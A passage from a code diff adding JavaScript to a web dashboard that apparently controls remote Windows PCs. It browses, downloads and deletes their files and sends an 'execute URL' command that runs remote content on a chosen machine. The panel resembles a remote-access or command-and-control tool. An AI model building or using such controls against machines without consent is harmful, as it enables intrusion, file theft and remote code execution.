+                     fileList(parts.join('\\') || 'C:\\');
+                }
+            } else {
+                fileList('C:\\');
+            }
+        }
+
+        // Overwrite fileList to accept path argument
+        async function fileList(pathOverride) {
+            if (!selectedPC) return;
+            const pathInput = document.getElementById('filePath');
+            const path = pathOverride || pathInput.value || 'C:\\';
+            
+            // Update input if overridden
+            if (pathOverride) pathInput.value = pathOverride;
+
+            document.getElementById('fileManagerDisplay').innerHTML = '<div style="padding:10px; color:#6b7280;">Loading...</div>';
+
+            await api('/api/files/list', 'POST', { pc_name: selectedPC, path });
+            showToast('info', `Listing files in ${path}...`);
+        }
+
+        async function downloadFile(path) {
+            if (!selectedPC) return;
+            await api('/api/files/download', 'POST', { pc_name: selectedPC, path });
+            showToast('info', 'Download queued. Check terminal/logs for result.');
+        }
+
+        async function deleteFile(path) {
+            if (!selectedPC || !confirm(`Delete ${path}?`)) return;
+            await api('/api/files/delete', 'POST', { pc_name: selectedPC, path });
+            showToast('warning', 'Delete command queued.');
+        }
+
+        async function executeUrl() {
+            if (!selectedPC) return;
+            const url = document.getElementById('executeUrl').value;
+            if (!url) {
+                showToast('error', 'Please enter a URL');
+                return;
+            }
+            await api('/api/execute', 'POST', { pc_name: selectedPC, url });
+            showToast('success', 'Execute command sent');
+        }
+
+    </script>
+</body>
+
+</html>
